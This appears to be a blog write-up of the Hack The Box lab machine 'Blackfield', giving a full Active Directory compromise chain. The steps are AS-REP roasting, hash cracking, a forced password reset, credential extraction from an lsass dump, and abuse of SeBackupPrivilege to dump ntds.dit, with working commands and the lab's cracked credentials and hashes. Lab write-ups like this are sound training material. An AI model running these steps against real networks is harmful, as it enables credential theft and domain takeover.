---
layout: single
title: Blackfield - Hack The Box
excerpt: "Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. 
Once user is found to have Kerberos pre-authentication disabled, which allows an attacker to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext
password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, 
who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator."
date:  2022-04-21
header:
  teaser: /assets/img/blackfield/cover-blackfield.png
  teaser_home_page: true
  icon: /assets/htb.png
categories:
  - hackthebox
  - infosec
tag:
    - SeBackup
    - RPC
    - Active Directory
    - Bloodhound
    - ForceChangePassword
    - evil-winrm
---

![](/assets/img/blackfield/cover-blackfield.png)

## Synopsis

Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. 
Once user is found to have Kerberos pre-authentication disabled, which allows an attacker to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext
password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, 
who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.

## Portscan

```powershell
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-05 01:20:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-05T01:20:44
|_  start_date: N/A
```

## Reconnaissance

Doing ldap enumeration doesn't show me the way, so i keep move onto RPC service.
Sucessfully login anonymously on RPC, but we cannot use command such as `enumdomusers`,`enumdomains`.
anonymous login can also be done on the smbclient service

![](/assets/img/blackfield/1.png)

in this case we cannot able to list forensic share, but when we check the `profiles$` share we will get bunch of usernames. This is great because with these names we can perfrom AS-REP Roasting, this technique include KERBEROASTING Methodology.


> KERBEROASTING is stealling service account password and crack them offline with wordlist.


![](/assets/img/blackfield/2.png)

you can grab those names, and perform AS-REP Roasting using `GetNPusers.py` from impacket with prompt :

```powershell
GetNPUsers.py BLACKFIELD.local/ -usersfile usernames.txt -format hashcat -dc-ip 10.10.10.192 -outputfile AS-REP
```

Result from AS-REP

```powershell
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]
└──╼ #cat AS-REP 
$krb5asrep$23$support@BLACKFIELD.LOCAL:17bc70e610b036b35661ef81b9d57219$13aceded8bab3f6f2c6dd3252f562fb896a2940519ca82e31467833a818521d68d85169e37aa9e772c483454199a9d8cf588585b65522a85a294283b8288cc74ab0c9406bf60cb30174dd9ff95c78c72e02bcea4f047d0f0a59ccbc5ffbd314b8f26f63dd2ce409517d4e4489dc5b66203222eef34a70c00c49e30bdd3af2520c854d0dbbdf1ade21cdb9bd8e566c06d16d8e374b8004f76ec46f9e08700afd8ab4fc2c27231bdb79778f7468eb0cc089d5a0aa7dfabaa63fe2dd77d63154d73344e5e003a816e2cc6435082b25be46740356205a44940876089ffcf81f1ff5b9ac2d1e3cb474a1d9d99a8f8a99a7f0aff805300
```

We can use `hashcat` for crack the HASH using module 18200.

`hashcat -m 18200 -a 0 AS-REP ~/Desktop/htb-tool/rockyou.txt`

![](/assets/img/blackfield/3.png)

notif from hashcat successfully crack the hash with status cracked, now im gonna going to `forensic$` share using this creds.

`support:#00^BlackKnight`

![](/assets/img/blackfield/4.png)

we still dont have any access to this share, for further i will use [Bloodhound.py](https://github.com/fox-it/BloodHound.py) to collect information regarding targets.

`./bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all`

![](/assets/img/blackfield/5.png)

in this below result from bloodhound

![](/assets/img/blackfield/6.png)

We found what we need in this time, user support can change password for audit2020. RPC service has change password feature, we can take advantages of this service, change password for `audit2020` user into `Password123`.

![](/assets/img/blackfield/7.png)

After change the password i move into smb share again to check if audit2020 has permission into their share or not.

![](/assets/img/blackfield/8.png)

at the time of enumeration i found the lsass.zip; in short Local Security Authority Subsytem Service (LSASS) is a process in Microsoft Windows operating system that is responsible for enforcing the security policy. It verifies users logging on to a windows computer or server, handles password changes, and creates access tokens.

Download the zip file into our host with prompt:

```bash
smbget -R smb://audit2020:'Password123'@10.10.10.192/forensic/memory_analysis/lsass.zip
```

after unzip this lsass.zip we will find file lsass.dmp, actually we can dump this file using [pypykatz](https://github.com/skelsec/pypykatz) tools. 

```powershell
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]
└──╼ #ls | grep lsass.
lsass.DMP
lsass.zip
```

Exec command below for extracting DMP file :

`pypykatz lsa  minidump lsass.DMP -o dump.txt`

retrieve an information contains NTLM hash for svc_backup user, use the following hash to login using evil-winrm. 

```powershell
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]                                                                           
└──╼ #cat dump.txt
[..] 
Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: 9658d1d1dcd9250115e2205d9f48400d
SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
DPAPI: a03cd8e9d30171f3cfe8caad92fef621
[..]
Username: svc_backup
```

![](/assets/img/blackfield/9.png)

## Privilege Escalation

in privilege information sections i found `SeBackupPrivilege` and `SeRestorePrivilege` enabled, this privilege is highly vulnerable because we can backup anything from server such as `NDTS.dit`,`Security Account Manager(SAM)`.

```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
[..]

```

>SeBackupPrivilege privilege, the user can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.  
This privilege causes the system to grant all read access control to any file, regardless of the [_access control list_](https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly#_security_access_control_list_gly) (ACL) specified for the file. Any access request other than read is still evaluated with the ACL. The following access rights are granted if this privilege is held:  
READ\_CONTROL  
ACCESS\_SYSTEM\_SECURITY  
FILE\_GENERIC\_READ  
FILE\_TRAVERSE

and now we define the steps to gain access as administrator, firtsly add script below and given name script.txt, and then we can take advantages of `diskshadow` binary.

```powershell
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup  
```

execute `diskshadow /s script.txt` command will start backup from C drive into Z drive, after that you need to clone [this repo](https://github.com/giuliano108/SeBackupPrivilege) and upload .dll files into target.

```powershell
#evil-winrm
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll

# import module cmdlets command
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
```

after the backup process is complete we need to copy ntds.dit from Z drive into C:\temp\, and download `ntds.dit` and `system` into our host with following command: 

```powershell
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
reg save HKLM\SYSTEM c:\temp\system
```

last but not least use `secretdumps.py` from impacket to extract all information from ntds.dit with prompt :

`secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL`

```powershell
┌─[root@unknown101]─[10.10.14.14]─[~/Desktop/hackthebox/ActiveDirectory/Blackfield]                                                                                                                                                        
└──╼ #secretsdump.py -ntds ntds.dit -system system -just-dc LOCAL                 
Impacket v0.9.23.dev1+20210421.100825.fea485d2 - Copyright 2020 SecureAuth Corporation 
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393           
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c 
[*] Reading and decrypting hashes from ntds.dit                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f4a13e41e3ae7a47a76323a4c6ef8e33:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
```

like a charm!!! now we can use NTLM hash using evil-winrm as Administrator

![](/assets/img/blackfield/10.png)


### Referencess

```text
https://hashcat.net/wiki/doku.php?id=example_hashes
https://malicious.link/post/2017/reset-ad-user-password-with-linux/
https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
```